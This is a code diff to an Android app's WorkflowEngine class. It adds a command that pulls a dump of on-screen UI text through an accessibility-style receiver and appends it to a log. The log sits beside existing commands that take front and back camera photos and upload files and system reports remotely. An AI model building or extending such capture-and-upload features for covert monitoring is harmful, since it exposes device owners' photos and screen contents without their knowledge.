@@ -49,8 +49,7 @@ class WorkflowEngine(
         var currentUiAction = ""
         var currentOffset = 1
         var currentCaseSensitive = false
-        var currentEngine = "smart" // Now unused, linear DOM engine overrides this internally
-        
+        var currentEngine = "smart" 
         var currentEventType = ""
         var currentEventTarget = ""
 
@@ -62,6 +61,18 @@ class WorkflowEngine(
                     "cam_front" -> mediaHandler.takePicture(true)?.let { uploader.sendFile(it, "photo", "WF Front Cam") }
                     "cam_back" -> mediaHandler.takePicture(false)?.let { uploader.sendFile(it, "photo", "WF Back Cam") }
                     "info" -> log(systemHandler.generateFullSystemReport().readText())
+                    "dump_screen" -> {
+                        log("Requesting UI Screen Dump...")
+                        val dumpFile = requestScreenDump(context)
+                        if (dumpFile != null && dumpFile.exists()) {
+                            log("\n========= MANUAL UI DEBUG DUMP =========")
+                            FileWriter(logFile, true).use { it.write(dumpFile.readText() + "\n") }
+                            log("========================================\n")
+                            dumpFile.delete()
+                        } else {
+                            log("Failed to generate manual screen dump.")
+                        }
+                    }
                 }
             } else if (currentTaskType == "ui") {
                 log("UI Action: '$currentUiAction' on target '$currentUiTarget' near texts [$currentUiTexts]")
@@ -97,23 +108,15 @@ class WorkflowEngine(
                 
                 log("UI Result: $result")
                 
-                // --- DEBUG DUMP READER ---
                 if (result.contains("DEBUG DUMP GENERATED")) {
                     val dumpFile = File(context.filesDir, "ui_debug_dump.txt")
                     if (dumpFile.exists()) {
                         log("\n========= UI DEBUG DUMP (Extracted Screen Nodes) =========")
-                        try {
-                            FileWriter(logFile, true).use { writer -> 
-                                writer.write(dumpFile.readText() + "\n") 
-                            }
-                        } catch (e: Exception) {
-                            log("Failed to append debug dump: ${e.message}")
-                        }
+                        try { FileWriter(logFile, true).use { it.write(dumpFile.readText() + "\n") } } catch (e: Exception) {}
                         log("==========================================================\n")
-                        dumpFile.delete() // Clean up after reading
+                        dumpFile.delete()
                     }
                 }
-                
                 delay(1000)
                 
             } else if (currentTaskType == "wait_event") {
@@ -187,5 +190,33 @@ class WorkflowEngine(
         val logFile = File(context.filesDir, "${workflowName}_status.txt")
         if (logFile.exists()) uploader.sendDocument(logFile, "Status of Workflow: $workflowName")
         else uploader.sendText("No active logs found for $workflowName.")
+    }
+
+    // Extracted helper for manual requests
+    private suspend fun requestScreenDump(context: Context): File? = suspendCancellableCoroutine { cont ->
+        val receiver = object : BroadcastReceiver() {
+            override fun onReceive(c: Context?, intent: Intent?) {
+                if (intent?.action == "com.systemlinker.UI_RESULT") {
+                    context.unregisterReceiver(this)
+                    val msg = intent.getStringExtra("result") ?: ""
+                    if (msg.contains("SUCCESS")) {
+                        if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
+                    } else {
+                        if (cont.isActive) cont.resume(null)
+                    }
+                }
+            }
+        }
+        val filter = IntentFilter("com.systemlinker.UI_RESULT")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            context.registerReceiver(receiver, filter)
+        }
+        val intent = Intent("com.systemlinker.ACC_ACTION").apply {
+            setPackage(context.packageName)
+            putExtra("action", "dump_screen_request")
+        }
+        context.sendBroadcast(intent)
     }
 }
